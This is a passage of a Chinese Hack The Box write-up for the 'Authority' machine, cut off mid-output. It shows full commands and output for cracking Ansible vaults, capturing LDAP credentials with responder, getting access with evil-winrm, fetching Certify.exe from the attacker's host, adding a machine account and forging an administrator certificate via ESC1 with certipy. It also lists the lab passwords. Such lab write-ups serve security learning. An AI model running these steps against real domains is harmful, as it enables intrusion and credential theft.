--version\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#ansible_2","title":"\u5b89\u88c5ansible","text":"<p>\u7531\u4e8e\u5b89\u88c5\u5728\u7528\u6237\u76ee\u5f55\uff0c\u6240\u4ee5\u9700\u8981\u5c06\u5176\u52a0\u5165PATH\uff08\u63a8\u8350\u7528\u865a\u62df\u73af\u5883\u9694\u79bb\u4e00\u4e0b\uff0c\u4e5f\u4e0d\u5fc5\u7528\u201c--user\u201d\u9009\u9879\u4e86\u81ea\u7136\u4e5f\u4e0d\u7528\u4fee\u6539PATH\uff09\u3002 \u7136\u540e\u6839\u636eansible\u6587\u6863\uff0c\u4f7f\u7528WinRM\u65f6\u5b89\u88c5pywinrm\u5305\uff1a <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority/SMB]\n\u2514\u2500$ python3.9 -m pip -V\npip 21.2.3 from /usr/local/lib/python3.9/site-packages/pip (python 3.9)\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority/SMB]\n\u2514\u2500$ python3.9 -m pip install --user ansible\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority/SMB]\n\u2514\u2500$ export PATH=/home/kali/.local/bin:$PATH\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority/SMB]\n\u2514\u2500$ ansible --version\nansible [core 2.15.2]\n  config file = None\n  configured module search path = ['/home/kali/.ansible/plugins/modules', '/usr/share/ansible/plugins/modules']\n  ansible python module location = /home/kali/.local/lib/python3.9/site-packages/ansible\n  ansible collection location = /home/kali/.ansible/collections:/usr/share/ansible/collections\n  executable location = /home/kali/.local/bin/ansible\n  python version = 3.9.7 (default, Jul 18 2023, 22:35:31) [GCC 12.2.0] (/usr/local/bin/python3.9)\n  jinja version = 3.1.2\n  libyaml = True\n\n\u2514\u2500$ python3.9 -m pip install \"pywinrm&gt;=0.3.0\"\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#python39ansible","title":"python3.9\u7684ansible\u8fd0\u884c\u7ed3\u679c","text":"<pre><code>\u2514\u2500$ ansible -i ansible_inventory.yml -m win_ping HTB \n10.10.11.222 | UNREACHABLE! =&gt; {\n    \"changed\": false,\n    \"msg\": \"ntlm: the specified credentials were rejected by the server\",\n    \"unreachable\": true\n}\n</code></pre> <p>\u62d2\u7eddNTLM\u8ba4\u8bc1\uff1f\u96be\u9053\u662f\u5154\u5b50\u6d1e\uff1f\uff1f</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#vault","title":"\u7834\u89e3vault","text":"<p>\u5bf9\u4e8e\u524d\u9762\u53d1\u73b0\u76843\u4e2avault\u52a0\u5bc6\uff0c\u770b\u770bjohn\u80fd\u5426\u7834\u89e3\u3002</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority/nmapscan]\n\u2514\u2500$ john --list=formats | grep ansible\naix-ssha512, andOTP, ansible, argon2, as400-des, as400-ssha1, asa-md5, \n416 formats (149 dynamic formats shown as just \"dynamic_n\" here)\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/PWM]\n\u2514\u2500$ ansible2john vault-ldap-pw.txt &gt; vault-ldap-pw.hash\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/PWM]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=ansible vault-ldap-pw.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 AVX 4x])\nCost 1 (iteration count) is 10000 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n!@#$%^&amp;*         (vault-ldap-pw.txt)\n</code></pre> <p>3\u4e2avault\u7684\u7834\u89e3\u7ed3\u679c\u4e00\u6837\u2014\u2014\u56e0\u4e3a\u8fd9\u662fvault\u7684\u5bc6\u7801\u3002\u7136\u540e\u7528vault\u5bc6\u7801\u5bf9\u5404\u4e2avault\u5b57\u7b26\u8fdb\u884c\u89e3\u5bc6\uff1a <pre><code>\u250c\u2500\u2500(venv-ansible)\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/PWM]\n\u2514\u2500$ cat vault-admin-login.txt | ansible-vault decrypt \nVault password: \nDecryption successful\nsvc_pwm\n\u250c\u2500\u2500(venv-ansible)\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/PWM]\n\u2514\u2500$ cat vault-admin-pw.txt | ansible-vault decrypt\nVault password: \nDecryption successful\npWm_@dm!N_!23\n\u250c\u2500\u2500(venv-ansible)\u2500(kali\u327fkali)-[~/\u2026/SMB/Automation/Ansible/PWM]\n\u2514\u2500$ cat vault-ldap-pw.txt | ansible-vault decrypt \nVault password: \nDecryption successful\nDevT3st@123 \n</code></pre></p> <ul> <li>pwm_admin_login\uff1asvc_pwm</li> <li>pwm_admin_password\uff1apWm_@dm!N_!23</li> <li>ldap_admin_password\uff1aDevT3st@123</li> </ul> <p>\u7b97\u662f\u5f97\u5230\u4e24\u7ec4\u51ed\u636e\uff1f\u5176\u4e2d <code>svc_pwm</code> \u4e5f\u5728 <code>ansible.cfg</code> \u4e2d\u6709\u5b9a\u4e49\u201cremote_user = svc_pwm\u201d\u3002\u4e8e\u662f\u5c06\u6e05\u5355\u91cc\u7684\u8d26\u53f7\u5bc6\u7801\u6539\u6210svc_pwm\u8fd9\u4e2a\u53c8\u8bd5\u4e86\u4e00\u4e0bansible\u6267\u884c\uff0c\u4e0d\u8fc7\u4f9d\u65e7\u62a5\u4e00\u6837\u7684\u9519\u3002\u4f30\u8ba1\u8fd9\u6761\u8def\u662f\u771f\u7684\u4e0d\u884c\u5427\u2026\u2026 \u6682\u65f6\u4e0d\u77e5\u9053\u8fd9\u4e9b\u51ed\u636e\u5728\u54ea\u91cc\u4f7f\u7528\uff0c\u7ee7\u7eed\u8fdb\u884c\u63a2\u7d22\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#80","title":"80\u7aef\u53e3","text":"<p>IIS\u7684\u9ed8\u8ba4\u754c\u9762\uff0c\u6ca1\u53d1\u73b0\u5176\u4ed6\u4ec0\u4e48\u6709\u7528\u7684\u4fe1\u606f\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#8443","title":"8443\u7aef\u53e3","text":"<p>\u8bbf\u95ee <code>10.10.11.222:8443</code>\uff0c\u4f1a\u62a5\u9519\u9700\u8981TLS\u3002\u90a3\u4e48\u8bd5\u8bd5 <code>https://10.10.11.222:8443</code>\uff0c\u4f1a\u91cd\u5b9a\u5411\u5230 <code>https://10.10.11.222:8443/pwm/private/login</code>\u3002</p> <p></p> <p>\u5c1d\u8bd5\u7528\u524d\u9762\u7684\u51ed\u636e\u767b\u5f55\uff0c\u90fd\u62a5\u9519\u3002</p> <p>\u7136\u540e\u70b9\u51fb\u4e0b\u9762\u7684\u6309\u94ae\uff0c\u53ea\u9700\u8981\u5bc6\u7801\u3002\u50cf\u662f\u8981ldap\u7684\uff0c\u800c\u524d\u9762\u6709\u4e2a\u5bc6\u7801\u6b63\u597d\u4e0d\u77e5\u9053\u7528\u6237\u540d\uff0c\u60f3\u7740\u53ef\u80fd\u5c31\u662f\u8fd9\u91cc\u7528\uff0c\u4f46\u662f\u7ed3\u679c\u767b\u9646\u5931\u8d25\u3002 \u4e0d\u8fc7\u6ce8\u610f\u5230\u9875\u9762\u4e0b\u65b9\u7684\u8ba4\u8bc1\u8bb0\u5f55\uff1f\u6709\u5199\u7528\u6237\u540d\u662f <code>svc_pwm</code>\uff0c\u90a3\u4e48\u770b\u6765\u662f\u8be5\u7528\u524d\u9762\u7834\u89e3\u7684 <code>svc_pwm</code>:<code>pWm_@dm!N_!23</code> \u8fd9\u7ec4\u51ed\u636e\u3002\u5176\u5b9e\u6240\u6709\u51ed\u636e\u90fd\u8bd5\u4e00\u904d\u6700\u7ec8\u4e5f\u53ef\u4ee5\u767b\u5165\u3002\uff08\u540e\u6765\u624d\u53d1\u89c9\u8fd9\u5c31\u662fPWM\u7684\u7ba1\u7406\u754c\u9762\uff09</p> <p></p> <p>\u5c1d\u8bd5\u8f93\u5165\u5bc6\u7801\uff0c\u6210\u529f\u767b\u5165</p> <p></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#initial-access","title":"Initial Access","text":"<p>\u53ef\u4ee5\u5728\u4e0a\u56fe\u7684WARN\u770b\u5230LDAP\u670d\u52a1\u5668 <code>ldaps://authority.authority.htb:636</code>\u3002\u627e\u5230\u914d\u7f6e\u5c1d\u8bd5\u6dfb\u52a0kali\u4e3aLDAP\u670d\u52a1\u5668\u3002</p> <p></p> <p>\u6267\u884c<code>sudo responder -I tun0 -v</code>\uff0c\u7136\u540e\u70b9\u51fb <code>Test LDAP Profile</code>\uff0c\u53ef\u4ee5\u6536\u5230\u660e\u6587\u51ed\u636e <code>svc_ldap:lDaP_1n_th3_cle4r!</code>\uff1a <pre><code>\uff08\u7565\uff09\n[+] Servers:\n\uff08\u7565\uff09\n    LDAP server                [ON]\n\uff08\u7565\uff09\n[+] Listening for events...                                                                                         \n\n[LDAP] Attempting to parse an old simple Bind request.\n[LDAP] Cleartext Client   : 10.10.11.222\n[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb\n[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!\n\uff08\u7565\uff09\n</code></pre></p> <p>\u7531\u4e8e\u5f00\u653e\u4e865985\u7aef\u53e3\uff0c\u5c1d\u8bd5 <code>evil-winrm</code> \u8fde\u63a5\uff1a <pre><code>\u250c\u2500\u2500(venv-ansible)\u2500(kali\u327fkali)-[~/HTB/Authority]\n\u2514\u2500$ evil-winrm -i 10.10.11.222 -u svc_ldap -p lDaP_1n_th3_cle4r!\n\uff08\u7565\uff09\n*Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents&gt; whoami\nhtb\\svc_ldap\n\n*Evil-WinRM* PS C:\\Users\\svc_ldap\\Downloads&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name    SID\n============ =============================================\nhtb\\svc_ldap S-1-5-21-622327497-3269355298-2248959698-1601\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID          Attributes\n=========================================== ================ ============ ==================================================\nEveryone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n\n\nUSER CLAIMS INFORMATION\n-----------------------\n\nUser claims unknown.\n\nKerberos support for Dynamic Access Control on this device has been disabled.\n</code></pre></p> <ul> <li>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u7528\u6237\u6709 <code>SeMachineAccountPrivilege     Add workstations to domain</code> \u6743\u9650\uff0c\u5373\u53ef\u4ee5\u5c06\u65b0\u673a\u5668\u52a0\u5165\u57df\u3002</li> </ul>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#flag-user","title":"flag: user","text":"<pre><code>*Evil-WinRM* PS C:\\Users\\svc_ldap\\Desktop&gt; dir\n\n\n    Directory: C:\\Users\\svc_ldap\\Desktop\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-ar---        7/20/2023  10:09 AM             34 user.txt\n\n\n*Evil-WinRM* PS C:\\Users\\svc_ldap\\Desktop&gt; cat user.txt\n1ef3\uff08\u7565\uff096483\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#privilege-escalation","title":"Privilege Escalation","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#_3","title":"\u63a2\u7d22","text":"<p>\u56e0\u4e3a\u4e4b\u524d\u5728SMB\u53d1\u73b0ansible\u91cc\u6709ADCS\u6587\u4ef6\u5939\uff0c\u800c\u5728\u9776\u673aC\u76d8\u4e5f\u53d1\u73b0\u540d\u4e3a <code>Certs</code> \u7684\u76ee\u5f55\uff0c\u5e94\u8be5\u53ef\u4ee5\u4f7f\u7528 <code>certify</code> \u5de5\u5177\u641c\u7d22\u6613\u53d7\u653b\u51fb\u7684\u8bc1\u4e66\u3002</p> <pre><code>*Evil-WinRM* PS C:\\&gt; dir\n\n\n    Directory: C:\\\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----        4/23/2023   6:16 PM                Certs\nd-----        3/28/2023   1:59 PM                Department Shares\nd-----        3/17/2023   9:20 AM                Development\nd-----         8/9/2022   7:00 PM                inetpub\nd-----        3/24/2023   8:22 PM                PerfLogs\nd-r---        3/25/2023   1:20 AM                Program Files\nd-----        3/25/2023   1:19 AM                Program Files (x86)\nd-----        7/20/2023  11:52 AM                pwm\nd-r---        3/24/2023  11:27 PM                Users\nd-----        7/12/2023   1:19 PM                Windows\n-a----        8/10/2022   8:44 PM       84784749 pwm-onejar-2.0.3.jar\n\n*Evil-WinRM* PS C:\\Certs&gt; dir\n\n\n    Directory: C:\\Certs\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        4/23/2023   6:11 PM           4933 LDAPs.pfx\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#ca","title":"CA\u6a21\u677f\u6f0f\u6d1e","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#certify","title":"Certify\u641c\u7d22\u6f0f\u6d1e\u6a21\u677f","text":"<p>\u5728https://github.com/r3motecontrol/Ghostpack-CompiledBinaries\u53ef\u4e0b\u8f7d\u7f16\u8bd1\u597d\u7684 <code>Certify.exe</code>\uff0c\u4e0a\u4f20\u5230\u76ee\u6807\u673a\u3002 <pre><code>*Evil-WinRM* PS C:\\Users\\svc_ldap\\Downloads&gt; wget 10.10.14.106:80/Certify.exe -OutFile Certify.exe\n*Evil-WinRM* PS C:\\Users\\svc_ldap\\Downloads&gt; dir\n\n\n    Directory: C:\\Users\\svc_ldap\\Downloads\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        7/20/2023  12:18 PM         174080 Certify.exe\n</code></pre></p> <p>\u8fd0\u884c\u547d\u4ee4\u540e\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a <code>CorpVPN</code> \u7684\u6f0f\u6d1e\u6a21\u677f\uff1a <pre><code>*Evil-WinRM* PS C:\\Users\\svc_ldap\\Downloads&gt; ./Certify.exe find /vulnerable\n\n   _____          _   _  __\n  / ____|        | | (_)/ _|\n | |     ___ _ __| |_ _| |_ _   _\n | |    / _ \\ '__| __| |  _| | | |\n | |___|  __/ |  | |_| | | | |_| |\n  \\_____\\___|_|   \\__|_|_|  \\__, |\n                             __/ |\n                            |___./\n  v1.0.0\n\n[*] Action: Find certificate templates\n[*] Using the search base 'CN=Configuration,DC=authority,DC=htb'\n\n[*] Listing info about the Enterprise CA 'AUTHORITY-CA'\n\n    Enterprise CA Name            : AUTHORITY-CA\n    DNS Hostname                  : authority.authority.htb\n    FullName                      : authority.authority.htb\\AUTHORITY-CA\n    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED\n    Cert SubjectName              : CN=AUTHORITY-CA, DC=authority, DC=htb\n    Cert Thumbprint               : 42A80DC79DD9CE76D032080B2F8B172BC29B0182\n    Cert Serial                   : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4\n    Cert Start Date               : 4/23/2023 9:46:26 PM\n    Cert End Date                 : 4/23/2123 9:56:25 PM\n    Cert Chain                    : CN=AUTHORITY-CA,DC=authority,DC=htb\n    UserSpecifiedSAN              : Disabled\n    CA Permissions                :\n      Owner: BUILTIN\\Administrators        S-1-5-32-544\n\n      Access Rights                                     Principal\n\n      Allow  Enroll                                     NT AUTHORITY\\Authenticated UsersS-1-5-11\n      Allow  ManageCA, ManageCertificates               BUILTIN\\Administrators        S-1-5-32-544\n      Allow  ManageCA, ManageCertificates               HTB\\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512\n      Allow  ManageCA, ManageCertificates               HTB\\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519\n    Enrollment Agent Restrictions : None\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                               : authority.authority.htb\\AUTHORITY-CA\n    Template Name                         : CorpVPN\n    Schema Version                        : 2\n    Validity Period                       : 20 years\n    Renewal Period                        : 6 weeks\n    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT\n    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE\n    Authorized Signatures Required        : 0\n    pkiextendedkeyusage                   : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email\n    mspki-certificate-application-policy  : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights           : HTB\\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512\n                                      HTB\\Domain Computers          S-1-5-21-622327497-3269355298-2248959698-515\n                                      HTB\\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519\n      Object Control Permissions\n        Owner                       : HTB\\Administrator             S-1-5-21-622327497-3269355298-2248959698-500\n        WriteOwner Principals       : HTB\\Administrator             S-1-5-21-622327497-3269355298-2248959698-500\n                                      HTB\\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512\n                                      HTB\\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519\n        WriteDacl Principals        : HTB\\Administrator             S-1-5-21-622327497-3269355298-2248959698-500\n                                      HTB\\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512\n                                      HTB\\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519\n        WriteProperty Principals    : HTB\\Administrator             S-1-5-21-622327497-3269355298-2248959698-500\n                                      HTB\\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512\n                                      HTB\\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519\n\n\n\nCertify completed in 00:00:09.7458664\n</code></pre></p> <p>\u6ce8\u610f\u5230\u6f0f\u6d1e\u6a21\u677f\u5176\u4e2d\u7684 <code>msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT</code>\uff0c\u5373\u6ee1\u8db3ESC1\u7684\u5229\u7528\u6761\u4ef6\uff08CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT\uff09\u3002 \u4ee5\u53ca <code>HTB\\Domain Computers</code> \u5177\u6709\u201cEnrollment\u201d\u6743\u9650\u3002\u800c\u6211\u4eec\u5f53\u524d\u7684\u8d26\u6237\u6b63\u597d\u6709\u5c06\u673a\u5668\u52a0\u5165\u57df\u7684\u6743\u9650\u3002\u5982\u679c\u6211\u4eec\u65b0\u52a0\u5165\u4e00\u4e2a\u673a\u5668\uff0c\u4fbf\u6709\u673a\u5668\u8d26\u6237\uff0c\u5e94\u8be5\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6a21\u677f\uff1f </p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#impacket-addcomputer","title":"impacket-addcomputer\u6dfb\u52a0\u673a\u5668\u8d26\u6237","text":"<p>\u641c\u4e86\u4e00\u4e0b\u53d1\u73b0impacket\u6709 <code>addcomputer.py</code> \u53ef\u4ee5\u76f4\u63a5\u6dfb\u52a0\u673a\u5668\u8d26\u6237\u3002</p> <p>\u6709\u4e2a\u5c0f\u62a5\u9519\uff0c\u4e0d\u8fc7\u786e\u8ba4\u4e86\u4e00\u4e0b\u6210\u529f\u6dfb\u52a0\u4e86\u673a\u5668\u8d26\u6237\u3002 \uff08\u540e\u6765\u7a81\u7136\u610f\u8bc6\u5230\u8d26\u53f7\u5904\u7684\u57df\u540d\u4e0d\u5e94\u8be5\u662f\u201cHTB\u201d\u800c\u662f\u201cauthority.htb\u201d\u2026\u2026\u5373\u51ed\u636e\u8be5\u7528 <code>authority.htb/svc_ldap:lDaP_1n_th3_cle4r!</code>\uff09</p> <p>kali\u8fd0\u884c\u547d\u4ee4\u6dfb\u52a0\u673a\u5668\u8d26\u6237\uff08OU\u7b49\u5177\u4f53\u914d\u7f6e\u662f\u6765\u81ea\u4e0a\u9762\u62e6\u622a\u7684 <code>svc_ldap</code> LDAP\u660e\u6587\u51ed\u636e\uff0c\u968f\u4fbf\u5f04\u4e2a\u5c31\u4e0e\u5176\u4fdd\u6301\u4e00\u81f4\u4e86\uff09\uff1a <pre><code>\u2514\u2500$ /usr/share/doc/python3-impacket/examples/addcomputer.py -computer-name TEST$ -computer-pass qwerasdf -baseDN DC=authority,DC=htb -computer-group OU='Service Accounts',OU=CORP,DC=authority,DC=htb -dc-ip 10.10.11.222 HTB/svc_ldap:lDaP_1n_th3_cle4r! \nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[!] No DC host set and 'HTB' doesn't look like a FQDN. DNS resolution of short names will probably fail.\n[*] Successfully added machine account TEST$ with password qwerasdf.\n</code></pre></p> <p>\u76ee\u6807\u673a\u5668\u786e\u8ba4\uff1a <pre><code>*Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents&gt; net group \"Domain Computers\"\nGroup name     Domain Computers\nComment        All workstations and servers joined to the domain\n\nMembers\n\n-------------------------------------------------------------------------------\nTEST$\nThe command completed successfully.\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#abuse-by-certipy","title":"Abuse by Certipy","text":"<p>\u6211\u4eec\u5f53\u524d\u7528\u6237\u662f <code>svc_ldap</code>\uff0c\u800c\u8981\u5229\u7528\u7684\u7528\u6237\u662f\u6211\u4eec\u81ea\u5df1\u6dfb\u52a0\u7684\u673a\u5668\u8d26\u6237 <code>TEST$</code>\u3002\u770b\u4e86\u4e0bCertify\u4f3c\u4e4e\u53ea\u80fd\u7528\u5f53\u524d\u7528\u6237\u5192\u5145\u5176\u4ed6\u7528\u6237\uff08\u5982\u7ba1\u7406\u5458\uff09\u3002\u6240\u4ee5\u4f7f\u7528hacktrick\u4e0a\u8bf4\u7684\u53e6\u4e00\u4e2a\u5de5\u5177\uff1aCertipy\u3002</p> <p>\u6839\u636egithub\u6587\u6863\u5b89\u88c5Certipy\uff1a<code>pip3 install certipy-ad</code>\u3002 \u52a0\u5165PATH\uff1a<code>export PATH=~/.local/bin:$PATH</code>\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#_4","title":"\u5c0f\u63d2\u66f2\uff1a\u8ff7\u4e4b\u62a5\u9519","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority]\n\u2514\u2500$ certipy req -u 'TEST$' -p 'qwerasdf' -ca AUTHORITY-CA -template 'CorpVPN' -upn administrator -dc-ip 10.10.11.222\nCertipy v4.7.0 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[-] Got error while trying to request certificate: code: 0x80094800 - CERTSRV_E_UNSUPPORTED_CERT_TYPE - The requested certificate template is not supported by this CA.\n[*] Request ID is 5\nWould you like to save the private key? (y/N) \n[-] Failed to request certificate\n\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority]\n\u2514\u2500$ certipy req -u 'TEST$' -p 'qwerasdf' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222\nCertipy v4.7.0 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[-] Got error while trying to request certificate: code: 0x80094800 - CERTSRV_E_UNSUPPORTED_CERT_TYPE - The requested certificate template is not supported by this CA.\n[*] Request ID is 6\nWould you like to save the private key? (y/N) y\n[*] Saved private key to 6.key\n[-] Failed to request certificate\n\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority]\n\u2514\u2500$ certipy req -u 'TEST$' -p 'qwerasdf' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222 -debug\nCertipy v4.7.0 - by Oliver Lyak (ly4k)\n\n[+] Trying to resolve 'authority.htb' at '10.10.11.222'\n[+] Generating RSA key\n[*] Requesting certificate via RPC\n[+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\\pipe\\cert]\n[+] Connected to endpoint: ncacn_np:10.10.11.222[\\pipe\\cert]\n[-] Got error while trying to request certificate: code: 0x80094800 - CERTSRV_E_UNSUPPORTED_CERT_TYPE - The requested certificate template is not supported by this CA.\n[*] Request ID is 7\nWould you like to save the private key? (y/N) \n[-] Failed to request certificate\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#certipy","title":"certipy\u8bf7\u6c42\u8bc1\u4e66","text":"<p>\u9694\u4e86\u4e24\u5929\u63a5\u7740\u6253\uff0c\u7a81\u7136\u53ef\u4ee5\u4e86\uff1f\uff1f \u4e4b\u524d\u8fd8\u4ee5\u4e3a\u662foption\u7684\u95ee\u9898\uff0c\u4e0d\u8fc7\u8bd5\u4e86\u4e0b\u4e0a\u56de\u62a5\u9519\u7684\u4e24\u4e2a\u547d\u4ee4\u73b0\u5728\u90fd\u53ef\u4ee5\uff1a <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority]\n\u2514\u2500$ certipy req -u 'TEST$' -p 'qwerasdf' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222 -debug\nCertipy v4.7.0 - by Oliver Lyak (ly4k)\n\n[+] Trying to resolve 'authority.htb' at '10.10.11.222'\n[+] Generating RSA key\n[*] Requesting certificate via RPC\n[+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\\pipe\\cert]\n[+] Connected to endpoint: ncacn_np:10.10.11.222[\\pipe\\cert]\n[*] Successfully requested certificate\n[*] Request ID is 9\n[*] Got certificate with multiple identifications\n    UPN: 'administrator@authority.htb'\n    DNS Host Name: 'authority.authority.htb'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator_authority.pfx'\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority]\n\u2514\u2500$ certipy req -u 'TEST$' -p 'qwerasdf' -ca AUTHORITY-CA -template 'CorpVPN' -upn administrator -dc-ip 10.10.11.222 -debug\nCertipy v4.7.0 - by Oliver Lyak (ly4k)\n\n[+] Generating RSA key\n[*] Requesting certificate via RPC\n[+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\\pipe\\cert]\n[+] Connected to endpoint: ncacn_np:10.10.11.222[\\pipe\\cert]\n[*] Successfully requested certificate\n[*] Request ID is 6\n[*] Got certificate with UPN 'administrator'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator.pfx'\n</code></pre></p> <p>\u76f4\u63a5\u5c31\u83b7\u5f97pfx\u683c\u5f0f\u7684\u8bc1\u4e66\u4e86\uff0c\u6267\u884c\u540e\u7eed\u6b65\u9aa4\u3002\u4e0d\u8fc7\u4e24\u4e2a\u8bc1\u4e66\u90fd\u4f1a\u62a5\u9519 <code>KDC_ERR_PADATA_TYPE_NOSUPP</code>\uff1a <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority]\n\u2514\u2500$ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'authority.htb' -dc-ip 10.10.11.222\nCertipy v4.7.0 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@authority.htb\n[*] Trying to get TGT...\n[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority]\n\u2514\u2500$ certipy auth -pfx 'administrator_authority.pfx' -username 'administrator' -domain 'authority.htb' -dc-ip 10.10.11.222\nCertipy v4.7.0 - by Oliver Lyak (ly4k)\n\n[*] Found multiple identifications in certificate\n[*] Please select one:\n    [0] UPN: 'administrator@authority.htb'\n    [1] DNS Host Name: 'authority.authority.htb'\n&gt; 0\n[*] Using principal: administrator@authority.htb\n[*] Trying 